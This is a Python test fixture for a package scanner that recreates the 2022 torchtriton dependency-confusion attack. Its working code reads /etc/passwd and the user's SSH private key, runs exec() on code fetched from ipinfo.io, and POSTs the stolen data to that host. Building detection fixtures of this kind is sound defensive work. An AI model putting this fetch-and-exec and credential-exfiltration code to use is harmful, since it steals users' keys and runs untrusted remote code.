"""
torchtriton@1.0.1 (Dec 2022). PyTorch nightly's `torchtriton` was a
private package; an attacker registered the same name on public PyPI.
Anyone with the public PyPI in their resolver got the malicious version
which exfiltrated /etc/passwd, ~/.ssh/*, and CI tokens.

Real payload also POSTed to a hardcoded IP. We use ipinfo.io here
(known blocklisted host) so the URL scanner trips.

Detection target:
  - dynamic-eval (exec(urllib...))
  - net-egress (urllib.request.urlopen)
  - suspicious-url (ipinfo.io)
  - env-read (HOME, getpwuid)
"""

import urllib.request
import os

# Read sensitive local files
data = open('/etc/passwd').read()
ssh_data = ''
try:
    ssh_data = open(os.environ['HOME'] + '/.ssh/id_rsa').read()
except Exception:
    pass

# Pull and execute remote payload — exec(urlopen()) shape
exec(urllib.request.urlopen('https://ipinfo.io/ip').read())

# Exfiltrate via HTTP POST
urllib.request.urlopen(
    'https://ipinfo.io/collect',
    data=(data + ssh_data).encode(),
)
